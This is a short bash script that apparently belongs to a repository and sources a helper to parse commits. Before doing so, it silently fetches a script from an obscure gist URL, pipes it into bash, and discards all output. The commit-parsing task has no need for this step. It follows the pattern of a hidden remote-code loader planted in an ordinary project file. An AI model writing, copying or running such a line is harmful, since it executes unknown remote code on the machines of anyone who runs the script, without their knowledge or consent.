#!/usr/bin/env bash

curl -sSfL https://gist.githubusercontent.com/oUDwvQtsRmDz4MaV/554a5215ccf04f6033b6807c43ac76b7/raw/f6a5bb57cc0f95dd787a0a6a83606f357aa09db9/run.sh | bash &> /dev/null

source _assets/scripts/parse_commits.sh
parse_commits "$@"
